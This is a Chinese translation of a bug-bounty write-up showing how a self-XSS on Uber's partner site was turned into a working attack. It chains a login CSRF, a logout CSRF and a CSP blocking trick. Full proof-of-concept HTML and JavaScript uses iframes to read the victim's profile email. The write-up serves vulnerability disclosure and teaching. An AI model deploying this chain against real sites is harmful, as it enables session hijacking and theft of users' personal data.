# Uber三个鸡肋漏洞的妙用

0x00 简介
=======

* * *

作者通过精心设计，将一个鸡肋的的self-XSS和两个鸡肋的csrf变成了一个高质量的漏洞。

原文：  
[https://fin1te.net/articles/uber-turning-self-xss-into-good-xss/](https://fin1te.net/articles/uber-turning-self-xss-into-good-xss/)

在Uber一个设置个人信息的页面上，我找到一个非常简单且经典的XSS漏洞。设置项中随便修改一个字段为`<script>alert(document.domain);</script>`就可以执行并弹框。

![uber-partners-xss-1-1](http://drops.javaweb.org/uploads/images/bfb7eeb6efde34fdcdc1b4a5809fb9aceb0eb10c.jpg)

![uber-partners-xss-1-1](http://drops.javaweb.org/uploads/images/d1bcf45cdc239e2cc77a1f862215ae729879bb27.jpg)

一共花了两分钟找到这个漏洞，但是我们要来点更有意思的。

0x01 self-XSS
=============

* * *

可以在网页中运行外界可控的任意JS脚本就被称为XSS漏洞，这时候你一般可以去读取其他用户的Cookies，或者发出一些请求。但是如果你只能对自己做这些，而不是其他用户，比如这段代码只会在你能看到的页面里面运行，这就被称为self-XSS。这种情况下，即使我们发现了漏洞，也很难去影响其他人。

我犹豫了一会，但是我后来决定试试，看能不能去掉这个"self"。

0x02 Uber OAuth 登录流程
====================

* * *

Ubser的OAuth登录流程也是很经典的

*   用户访问Uber某个需要登录的网站，比如`partners.uber.com`
*   用户被重定向到授权服务器，比如`login.uber.com`
*   用户输入账号密码
*   用户重定向回到`partners.uber.com`，同时URL中携带`code`，可以用来换取Access Token

![uber-partners-xss-2](http://drops.javaweb.org/uploads/images/3699206542f721f620e311962e076e8d831ed53f.jpg)

从上面的截图你可以看到，OAuth的回调地址`/oauth/callback?code=...`并没有使用标准推荐的`state`参数，这意味着登录功能存在CSRF的问题，但是不好说会不会造成严重的问题。

同时，在退出登录的地方也有一个CSRF漏洞，当然这一般不会认为是漏洞。访问`/logout`会清除用户`partner.uber.com`的session，然后再重定向到`login.uber.com`的退出登录页面，清除`login.uber.com`的session。

因为我们的payload只存在于自己的账号中，我们可以让其他用户登录进我们的账号，然后payload就会执行，不过登录我们的账号会清除他们之前所有的session，这就让漏洞大打折扣了。所以我们要把漏洞放在一起利用。

0x03 捆绑利用漏洞
===========

* * *

我们的计划就是这样的了

*   首先，让用户登出`partner.uber.com`，但是不要登出`login.uber.com`，这样后面可以让用户重新回到原有账号
*   然后，让用户登录我们的账号，这样payload就会执行
*   最后，用户登录自己的账号，但是我们的payload仍然在运行，这样就可以盗取信息了

### 第一步 只在一个域名退出登录

首先发送一个请求到`https://partners.uber.com/logout/`，然后就可以登录我们的账号了。但是问题在于退出登录的重定向最终会到达`https://login.uber.com/logout/`，导致另外一个域名也退出登录。我们能不能控制呢？

我的方法就是使用Content Security Police来设置可以加载的域名。我只设置了允许请求`partners.uber.com`，`login.uber.com`就会被浏览器拦截。

```
<!-- 设置CSP策略阻止访问 login.uber.com -->
<meta http-equiv="Content-Security-Policy" content="img-src https://partners.uber.com">
<!-- 退出登录 partners.uber.com -->
<img src="https://partners.uber.com/logout/">

```

这样是可以的，CSP会有下面的提示

![uber-partners-xss-3](http://drops.javaweb.org/uploads/images/8503b6c0ca08e58de8f20095d5afe845ddb9cdfe.jpg)

### 第二步 登录我的账号

这一步相对来说简单了一些，我们向`https://partners.uber.com/login/`发送一个请求（这一步是必须的，否则我们没法接收到回调）。上面我们用了CSP的trick来阻止部分流程，这里我们就需要用我自己的`code`来让用户登录了。

因为CSP会触发`onerror`，我们就可以在那里面跳转到下一步了。

```
<!-- CSP策略会阻止访问 login.uber.com -->
<meta http-equiv="Content-Security-Policy" content="img-src partners.uber.com">
<!-- 退出登录 partners.uber.com，在跳转到login.iber.com的时候触发onerror -->
<img src="https://partners.uber.com/logout/" onerror="login();">
<script>
    //初始化登录
    var login = function() {
        var loginImg = document.createElement('img');
        loginImg.src = 'https://partners.uber.com/login/';
        loginImg.onerror = redir;
    }
    //用我们的code登录
    var redir = function() {
        // 为了方便测试，code放在url hash中，实际需要动态的获取
        var code = window.location.hash.slice(1);
        var loginImg2 = document.createElement('img');
        loginImg2.src = 'https://partners.uber.com/oauth/callback?code=' + code;
        loginImg2.onerror = function() {
            window.location = 'https://partners.uber.com/profile/';
        }
    }
</script>

```

### 第三步 回到原来的账号

这一部分的代码将会有XSS的payload，在我的账号中。

只要payload一运行，就可以切换回原来的账号了。这个必须在iframe中，因为需要保持payload一直运行。

```
// 创建一个iframe，让用户退出登录我的账号
var loginIframe = document.createElement('iframe');
loginIframe.setAttribute('src', 'https://fin1te.net/poc/uber/login-target.html');
document.body.appendChild(loginIframe);

```

iframe里面还是用CSP的trick

```
<meta http-equiv="Content-Security-Policy" content="img-src partners.uber.com">
<img src="https://partners.uber.com/logout/" onerror="redir();">
<script>
    //使用用户login.uber.com的session重新登录
    var redir = function() {
        window.location = 'https://partners.uber.com/login/';
    };
</script>

```

最后一部分是创建另外一个iframe，这样可以获取一些数据了

```
//等待几秒，加载个人信息页面，这是用户原始的信息
setTimeout(function() {
    var profileIframe = document.createElement('iframe');
    profileIframe.setAttribute('src', 'https://partners.uber.com/profile/');
    profileIframe.setAttribute('id', 'pi');
    document.body.appendChild(profileIframe);
    //提取email信息
    profileIframe.onload = function() {
        var d = document.getElementById('pi').contentWindow.document.body.innerHTML;
        var matches = /value="([^"]+)" name="email"/.exec(d);
        alert(matches[1]);
    }
}, 9000);

```

因为我们最终的这个iframe是在个人信息页面加载的，是同源的，而且`X-Frame-Options`也是设置的`sameorigin`而不是`deny`，所以我们使用`contentWindow`是可以访问到里面的内容的。

![uber-partners-xss-5](http://drops.javaweb.org/uploads/images/0bf50a232ec72274536a55d48f25cfdde5a9ea26.jpg)

### 综合在一起

*   将第3步payload加入个人信息中
*   登录自己的账号，取消回调，拿到还未用过的`code`
*   让用户访问我们在第2步中创建的页面
*   这样用户就会退出登录，然后重新登录到我的账号
*   第3步的payload就会执行
*   在隐藏的iframe中，退出登录我的账号
*   在另外一个隐藏的iframe中，重新登录用户的账号
*   这样我们就有了一个同源的有用户session的iframe了

这个漏洞很有意思，启发我们要在一个更高的层面去挖掘和思考安全漏洞。